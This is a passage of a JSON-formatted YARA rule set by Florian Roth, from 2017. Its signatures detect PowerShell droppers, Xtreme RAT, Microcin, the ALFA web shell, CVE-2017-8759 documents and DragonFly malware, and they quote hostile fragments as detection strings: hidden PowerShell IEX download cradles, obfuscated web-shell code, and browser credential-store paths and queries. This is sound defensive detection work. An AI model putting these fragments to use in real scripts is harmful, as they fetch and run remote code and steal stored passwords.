\"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SCRIPT, T1064, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Process.Create(\\\"powershell.exe -nop -w hidden\" fullword ascii nocase\n      $x2 = \".Run\\\"powershell.exe -nop -w hidden -c \\\"\\\"IEX \" ascii\n      $s1 = \"window.resizeTo 0,0\" fullword ascii\n   condition: \n      ( filesize < 2KB and 1 of them )\n}","date":"2017-09-30 12:05:01","description":"Detects suspicious PowerShell script in combo with VBS or JS ","minimum_yara":"1.7","name":"Susp_PowerShell_Sep17_1_RID2F9F","reference":"Internal Research","required_modules":[],"rule_hash":"a06561bfd6d7954b20d08c962be5584c","score":60,"tags":["DEMO","T1064","SCRIPT","T1086"]},{"author":"Florian Roth","content":"rule Susp_PowerShell_Sep17_2_RID2FA0 : DEMO FILE SCRIPT T1064 T1086 {\n   meta:\n      description = \"Detects suspicious PowerShell script in combo with VBS or JS \"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-09-30 12:05:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SCRIPT, T1064, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \".Run \\\"powershell.exe -nop -w hidden -e \" ascii\n      $x2 = \"FileExists(path + \\\"\\\\..\\\\powershell.exe\\\")\" fullword ascii\n      $x3 = \"window.moveTo -4000, -4000\" fullword ascii\n      $s1 = \"= CreateObject(\\\"Wscript.Shell\\\")\" fullword ascii\n   condition: \n      filesize < 20KB and ( ( uint16 ( 0 ) == 0x733c and 1 of ( $x* ) ) or 2 of them )\n}","date":"2017-09-30 12:05:11","description":"Detects suspicious PowerShell script in combo with VBS or JS ","minimum_yara":"1.7","name":"Susp_PowerShell_Sep17_2_RID2FA0","reference":"Internal Research","required_modules":[],"rule_hash":"9f959a750519450736bdec639faed105","score":75,"tags":["DEMO","T1064","SCRIPT","FILE","T1086"]},{"author":"Florian Roth","content":"rule Xtreme_Sep17_2_RID2C06 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects XTREME sample analyzed in September 2017\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-09-27 09:31:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Spy24.exe\" fullword wide\n      $s2 = \"Remote Service Application\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of them )\n}","date":"2017-09-27 09:31:31","description":"Detects XTREME sample analyzed in September 2017","minimum_yara":"1.7","name":"Xtreme_Sep17_2_RID2C06","reference":"Internal Research","required_modules":[],"rule_hash":"8e02c951f2bdb5ba33bee83aed95bf51","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Xtreme_Sep17_3_RID2C07 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects XTREME sample analyzed in September 2017\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-09-27 09:31:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"Keylogg\" fullword ascii\n      $s4 = \"XTREME\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 700KB and all of them )\n}","date":"2017-09-27 09:31:41","description":"Detects XTREME sample analyzed in September 2017","minimum_yara":"1.7","name":"Xtreme_Sep17_3_RID2C07","reference":"Internal Research","required_modules":[],"rule_hash":"74f6e84cecfb523dbfc7553f80386786","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Xtreme_Sep17_1_RID2C05 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects XTREME sample analyzed in September 2017\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-09-27 09:31:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"ServerKeyloggerU\" fullword ascii\n      $x2 = \"TServerKeylogger\" fullword ascii\n      $x3 = \"XtremeKeylogger\" fullword wide\n      $x4 = \"XTREMEBINDER\" fullword wide\n      $s1 = \"shellexecute=\" fullword wide\n      $s2 = \"[Execute]\" fullword wide\n      $s3 = \";open=RECYCLER\\\\S-1-5-21-1482476501-3352491937-682996330-1013\\\\\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and ( pe.imphash ( ) == \"735af2a144f62c50ba8e89c1c59764eb\" or ( 1 of ( $x* ) or 3 of them ) )\n}","date":"2017-09-27 09:31:21","description":"Detects XTREME sample analyzed in September 2017","minimum_yara":"1.7","name":"Xtreme_Sep17_1_RID2C05","reference":"Internal Research","required_modules":["pe"],"rule_hash":"10343d0e7b1acac9862f527b67ec5852","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Xtreme_RAT_Gen_Imp_RID2DCA : DEMO EXE FILE GEN MAL {\n   meta:\n      description = \"Detects XTREME sample analyzed in September 2017\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-09-27 10:46:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, GEN, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == \"d0bdf112886f3d846cc7780967d8efb9\" or pe.imphash ( ) == \"cc6f630f214cf890e63e899d8ebabba6\" or pe.imphash ( ) == \"e0f7991d50ceee521d7190effa3c494e\" )\n}","date":"2017-09-27 10:46:51","description":"Detects XTREME sample analyzed in September 2017","minimum_yara":"1.7","name":"Xtreme_RAT_Gen_Imp_RID2DCA","reference":"Internal Research","required_modules":["pe"],"rule_hash":"b6eda61d28d9e53ed455b9ac4b5f4e7f","score":75,"tags":["DEMO","EXE","GEN","FILE","MAL"]},{"author":"Florian Roth","content":"rule Microcin_Sample_1_RID2D96 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Malware sample mentioned in Microcin technical report by Kaspersky\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf\"\n      date = \"2017-09-26 10:38:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"e Class Descriptor at (\" fullword ascii\n      $s2 = \".?AVCAntiAntiAppleFrameRealClass@@\" fullword ascii\n      $s3 = \".?AVCAntiAntiAppleFrameBaseClass@@\" fullword ascii\n      $s4 = \".?AVCAppleBinRealClass@@\" fullword ascii\n      $s5 = \".?AVCAppleBinBaseClass@@\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( 4 of them or pe.imphash ( ) == \"897077ca318eaf629cfe74569f10e023\" ) )\n}","date":"2017-09-26 10:38:11","description":"Malware sample mentioned in Microcin technical report by Kaspersky","minimum_yara":"1.7","name":"Microcin_Sample_1_RID2D96","reference":"https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf","required_modules":["pe"],"rule_hash":"ddb59d0e95372a286d4f0a90a2977b0e","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Microcin_Sample_2_RID2D97 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Malware sample mentioned in Microcin technical report by Kaspersky\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf\"\n      date = \"2017-09-26 10:38:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"[Pause]\" fullword ascii\n      $s7 = \"IconCache_%02d%02d%02d%02d%02d\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}","date":"2017-09-26 10:38:21","description":"Malware sample mentioned in Microcin technical report by Kaspersky","minimum_yara":"1.7","name":"Microcin_Sample_2_RID2D97","reference":"https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf","required_modules":[],"rule_hash":"769582e6a23cbd98bbb5dcd2cee02886","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Microcin_Sample_3_RID2D98 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Malware sample mentioned in Microcin technical report by Kaspersky\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf\"\n      date = \"2017-09-26 10:38:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"C:\\\\Users\\\\Lenovo\\\\Desktop\\\\test\\\\Release\\\\test.pdb\" fullword ascii\n      $s2 = \"test, Version 1.0\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}","date":"2017-09-26 10:38:31","description":"Malware sample mentioned in Microcin technical report by Kaspersky","minimum_yara":"1.7","name":"Microcin_Sample_3_RID2D98","reference":"https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf","required_modules":[],"rule_hash":"8b1ed923e2af62b48d9a1f125b3ba6d6","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Microcin_Sample_4_RID2D99 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Malware sample mentioned in Microcin technical report by Kaspersky\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf\"\n      date = \"2017-09-26 10:38:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmd /c dir /a /s \\\"%s\\\" > \\\"%s\\\"\" fullword wide\n      $s2 = \"ini.dat\" fullword wide\n      $s3 = \"winupdata\" fullword wide\n      $f1 = \"%s\\\\(%08x%08x)%s\" fullword wide\n      $f2 = \"%s\\\\d%08x\\\\d%08x.db\" fullword wide\n      $f3 = \"%s\\\\u%08x\\\\u%08x.db\" fullword wide\n      $f4 = \"%s\\\\h%08x\\\\h%08x.db\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of ( $s* ) or 5 of them )\n}","date":"2017-09-26 10:38:41","description":"Malware sample mentioned in Microcin technical report by Kaspersky","minimum_yara":"1.7","name":"Microcin_Sample_4_RID2D99","reference":"https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf","required_modules":[],"rule_hash":"209d1ef4592bbd03d1a00b3027bde864","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Microcin_Sample_5_RID2D9A : DEMO EXE FILE MAL {\n   meta:\n      description = \"Malware sample mentioned in Microcin technical report by Kaspersky\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf\"\n      date = \"2017-09-26 10:38:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Sorry, you are not fortuante ^_^, Please try other password dictionary \" fullword ascii\n      $x2 = \"DomCrack <IP> <UserName> <Password_Dic file path> <option>\" fullword ascii\n      $x3 = \"The password is \\\"%s\\\"         Time: %d(s)\" fullword ascii\n      $x4 = \"The password is \\\" %s \\\"         Time: %d(s)\" fullword ascii\n      $x5 = \"No password found!\" fullword ascii\n      $x7 = \"Can not found the Password Dictoonary file! \" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them ) or 2 of them\n}","date":"2017-09-26 10:38:51","description":"Malware sample mentioned in Microcin technical report by Kaspersky","minimum_yara":"1.7","name":"Microcin_Sample_5_RID2D9A","reference":"https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf","required_modules":[],"rule_hash":"c484413923079b10b50bd7468b051582","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Microcin_Sample_6_RID2D9B : DEMO EXE FILE MAL {\n   meta:\n      description = \"Malware sample mentioned in Microcin technical report by Kaspersky\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf\"\n      date = \"2017-09-26 10:39:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"** ERROR ** %s: %s\" fullword ascii\n      $s2 = \"TEMPDATA\" fullword wide\n      $s3 = \"Bruntime error \" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and all of them )\n}","date":"2017-09-26 10:39:01","description":"Malware sample mentioned in Microcin technical report by Kaspersky","minimum_yara":"1.7","name":"Microcin_Sample_6_RID2D9B","reference":"https://securelist.com/files/2017/09/Microcin_Technical-PDF_eng_final.pdf","required_modules":[],"rule_hash":"4cf718c5de310c200208af11294f0486","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Sharpire_RID2A4F : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Semiautomatic generated rule - file Sharpire_RID2A4F.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/0xbadjuju/Sharpire_RID2A4F\"\n      date = \"2017-09-23 05:03:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\obj\\\\Debug\\\\Sharpire_RID2A4F.pdb\" fullword ascii\n      $x2 = \"[*] Upload of $fileName successful\" fullword wide\n      $s1 = \"no shell command supplied\" fullword wide\n      $s2 = \"/login/process.php\" fullword wide\n      $s3 = \"invokeShellCommand\" fullword ascii\n      $s4 = \"..Command execution completed.\" fullword wide\n      $s5 = \"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\" fullword wide\n      $s6 = \"/admin/get.php\" fullword wide\n      $s7 = \"[!] Error in stopping job: \" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( 1 of ( $x* ) and 3 of them ) )\n}","date":"2017-09-23 05:03:21","description":"Semiautomatic generated rule - file Sharpire.exe","minimum_yara":"1.7","name":"Sharpire_RID2A4F","reference":"https://github.com/0xbadjuju/Sharpire","required_modules":[],"rule_hash":"af83750796220002e169740cc58ad9c1","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Invoke_Metasploit_RID2DFE : DEMO HKTL METASPLOIT T1105 {\n   meta:\n      description = \"Detects Invoke-Metasploit Payload\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/jaredhaight/Invoke-MetasploitPayload/blob/master/Invoke-MetasploitPayload.ps1\"\n      date = \"2017-09-23 10:55:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, METASPLOIT, T1105\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[*] Looks like we're 64bit, using regular powershell.exe\" ascii wide\n      $s2 = \"[*] Kicking off download cradle in a new process\" \n      $s3 = \"Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring('''+$url+''');'\" \n   condition: \n      ( filesize < 20KB and 1 of them )\n}","date":"2017-09-23 10:55:31","description":"Detects Invoke-Metasploit Payload","minimum_yara":"1.7","name":"Invoke_Metasploit_RID2DFE","reference":"https://github.com/jaredhaight/Invoke-MetasploitPayload/blob/master/Invoke-MetasploitPayload.ps1","required_modules":[],"rule_hash":"72b357bde2605ade189a08a08e4a350d","score":75,"tags":["METASPLOIT","T1105","DEMO","HKTL"]},{"author":"Florian Roth","content":"rule ALFA_SHELL_RID29FC : APT DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Detects web shell often used by Iranian APT groups\"\n      author = \"Florian Roth\"\n      reference = \"http://getalfa.rf.gd/?i=1\"\n      date = \"2017-09-21 02:45:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"$OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63%6f%5f%74%6e%64')\" ascii\n      $x2 = \"#solevisible@gmail.com\" fullword ascii\n      $x3 = \"'login_page' => '500',//gui or 500 or 403 or 404\" fullword ascii\n      $x4 = \"$GLOBALS['__ALFA__']\" fullword ascii\n      $x5 = \"if(!function_exists('b'.'as'.'e6'.'4_'.'en'.'co'.'de')\" ascii\n      $f1 = { 76 2F 38 76 2F 36 76 2F 2B 76 2F 2F 66 38 46 27 29 3B 3F 3E 0D 0A } \n   condition: \n      ( filesize < 900KB and 2 of ( $x* ) or $f1 at ( filesize - 22 ) )\n}","date":"2017-09-21 02:45:01","description":"Detects web shell often used by Iranian APT groups","minimum_yara":"1.7","name":"ALFA_SHELL_RID29FC","reference":"http://getalfa.rf.gd/?i=1","required_modules":[],"rule_hash":"bde28a0344aee9d6fe13a03eb2a92332","score":80,"tags":["T1100","DEMO","WEBSHELL","APT"]},{"author":"Florian Roth","content":"rule CVE_2017_8759_SOAP_Excel_RID2E36 : DEMO EXPLOIT OFFICE T1193 T1203 {\n   meta:\n      description = \"Detects malicious files related to CVE-2017-8759\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/buffaloverflow/status/908455053345869825\"\n      date = \"2017-09-15 11:04:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXPLOIT, OFFICE, T1193, T1203\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"|'soap:wsdl=\" ascii wide nocase\n   condition: \n      ( filesize < 300KB and 1 of them )\n}","date":"2017-09-15 11:04:51","description":"Detects malicious files related to CVE-2017-8759","minimum_yara":"1.7","name":"CVE_2017_8759_SOAP_Excel_RID2E36","reference":"https://twitter.com/buffaloverflow/status/908455053345869825","required_modules":[],"rule_hash":"e31482bbeea9488a2661118446a35eb8","score":60,"tags":["EXPLOIT","OFFICE","DEMO","T1203","T1193"]},{"author":"Florian Roth","content":"rule CVE_2017_8759_Mal_HTA_RID2D09 : DEMO EXPLOIT FILE T1193 T1203 {\n   meta:\n      description = \"Detects malicious files related to CVE-2017-8759 - file cmd.hta\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Voulnet/CVE-2017-8759-Exploit-sample\"\n      date = \"2017-09-14 10:14:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXPLOIT, FILE, T1193, T1203\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Error = Process.Create(\\\"powershell -nop cmd.exe /c\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x683c and filesize < 1KB and all of them )\n}","date":"2017-09-14 10:14:41","description":"Detects malicious files related to CVE-2017-8759 - file cmd.hta","minimum_yara":"1.7","name":"CVE_2017_8759_Mal_HTA_RID2D09","reference":"https://github.com/Voulnet/CVE-2017-8759-Exploit-sample","required_modules":[],"rule_hash":"91ac33411ecb33ce0b04f5a12af01c46","score":75,"tags":["EXPLOIT","DEMO","T1203","FILE","T1193"]},{"author":"Florian Roth","content":"rule CVE_2017_8759_Mal_Doc_RID2D42 : DEMO EXPLOIT FILE T1193 T1203 {\n   meta:\n      description = \"Detects malicious files related to CVE-2017-8759 - file Doc1.doc\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Voulnet/CVE-2017-8759-Exploit-sample\"\n      date = \"2017-09-14 10:24:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXPLOIT, FILE, T1193, T1203\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"soap:wsdl=http://\" ascii wide nocase\n      $s2 = \"soap:wsdl=https://\" ascii wide nocase\n      $s3 = \"soap:wsdl=http%3A%2F%2F\" ascii wide nocase\n      $s4 = \"soap:wsdl=https%3A%2F%2F\" ascii wide nocase\n      $c1 = \"Project.ThisDocument.AutoOpen\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0xcfd0 and filesize < 500KB and ( 1 of ( $s* ) and $c1 )\n}","date":"2017-09-14 10:24:11","description":"Detects malicious files related to CVE-2017-8759 - file Doc1.doc","minimum_yara":"1.7","name":"CVE_2017_8759_Mal_Doc_RID2D42","reference":"https://github.com/Voulnet/CVE-2017-8759-Exploit-sample","required_modules":[],"rule_hash":"5c93520f209dcfe349912c9463b43c29","score":75,"tags":["EXPLOIT","DEMO","T1203","FILE","T1193"]},{"author":"Florian Roth","content":"rule CVE_2017_8759_SOAP_via_JS_RID2E81 : DEMO EXPLOIT {\n   meta:\n      description = \"Detects SOAP WDSL Download via JavaScript\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/buffaloverflow/status/907728364278087680\"\n      date = \"2017-09-14 11:17:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"GetObject(\\\"soap:wsdl=https://\" ascii wide nocase\n      $s2 = \"GetObject(\\\"soap:wsdl=http://\" ascii wide nocase\n   condition: \n      ( filesize < 3KB and 1 of them )\n}","date":"2017-09-14 11:17:21","description":"Detects SOAP WDSL Download via JavaScript","minimum_yara":"1.7","name":"CVE_2017_8759_SOAP_via_JS_RID2E81","reference":"https://twitter.com/buffaloverflow/status/907728364278087680","required_modules":[],"rule_hash":"2be3f1a0db3bc48b7d3efcf756f2e479","score":60,"tags":["EXPLOIT","DEMO"]},{"author":"Florian Roth","content":"rule CVE_2017_8759_SOAP_txt_RID2DA5 : DEMO EXPLOIT T1193 T1203 {\n   meta:\n      description = \"Detects malicious file in releation with CVE-2017-8759 - file exploit.txt\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Voulnet/CVE-2017-8759-Exploit-sample\"\n      date = \"2017-09-14 10:40:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXPLOIT, T1193, T1203\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = /<soap:address location=\"http[s]?:\\/\\/[^\"]{8,140}.hta\"/ ascii wide\n      $s2 = /<soap:address location=\"http[s]?:\\/\\/[^\"]{8,140}mshta.exe\"/ ascii wide\n   condition: \n      ( filesize < 200KB and 1 of them )\n}","date":"2017-09-14 10:40:41","description":"Detects malicious file in releation with CVE-2017-8759 - file exploit.txt","minimum_yara":"1.7","name":"CVE_2017_8759_SOAP_txt_RID2DA5","reference":"https://github.com/Voulnet/CVE-2017-8759-Exploit-sample","required_modules":[],"rule_hash":"cd2cd96573c20de5e68cfab5330d1a86","score":75,"tags":["EXPLOIT","DEMO","T1203","T1193"]},{"author":"Florian Roth","content":"rule Unspecified_Malware_Sep1_A1_RID3131 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from DrqgonFly APT report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\"\n      date = \"2017-09-12 13:12:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and pe.imphash ( ) == \"17a4bd9c95f2898add97f309fc6f9bcd\" )\n}","date":"2017-09-12 13:12:01","description":"Detects malware from DrqgonFly APT report","minimum_yara":"1.7","name":"Unspecified_Malware_Sep1_A1_RID3131","reference":"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group","required_modules":["pe"],"rule_hash":"810c6910e163417fa85235890dc32b50","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule DragonFly_APT_Sep17_1_RID2E5A : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from DrqgonFly APT report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\"\n      date = \"2017-09-12 11:10:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\Update\\\\Temp\\\\ufiles.txt\" fullword wide\n      $s2 = \"%02d.%02d.%04d %02d:%02d\" fullword wide\n      $s3 = \"*pass*.*\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them )\n}","date":"2017-09-12 11:10:51","description":"Detects malware from DrqgonFly APT report","minimum_yara":"1.7","name":"DragonFly_APT_Sep17_1_RID2E5A","reference":"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group","required_modules":[],"rule_hash":"041389263d30bea7f856e6489fa72aae","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule DragonFly_APT_Sep17_2_RID2E5B : APT DEMO EXE FILE MAL T1003 {\n   meta:\n      description = \"Detects malware from DrqgonFly APT report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\"\n      date = \"2017-09-12 11:11:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\AppData\\\\Roaming\\\\Opera Software\\\\Opera Stable\\\\Login Data\" fullword wide\n      $s2 = \"C:\\\\Users\\\\Public\\\\Log.txt\" fullword wide\n      $s3 = \"SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins\" fullword wide\n      $s4 = \"***************** Mozilla Firefox ****************\" fullword wide\n      $s5 = \"********************** Opera *********************\" fullword wide\n      $s6 = \"\\\\AppData\\\\Local\\\\Microsoft\\\\Credentials\\\\\" fullword wide\n      $s7 = \"\\\\Appdata\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\\" fullword wide\n      $s8 = \"**************** Internet Explorer ***************\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 3 of them )\n}","date":"2017-09-12 11:11:01","description":"Detects malware from DrqgonFly APT report","minimum_yara":"1.7","name":"DragonFly_APT_Sep17_2_RID2E5B","reference":"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group","required_modules":[],"rule_hash":"2bf6250527b5d68ad5a5d96a9cf751ca","score":75,"tags":["MAL","DEMO","T1003","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule DragonFly_APT_Sep17_3_RID2E5C : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from DrqgonFly APT report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\"\n      date = \"2017-09-12 11:11:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"kernel64.dll\" fullword ascii\n      $s2 = 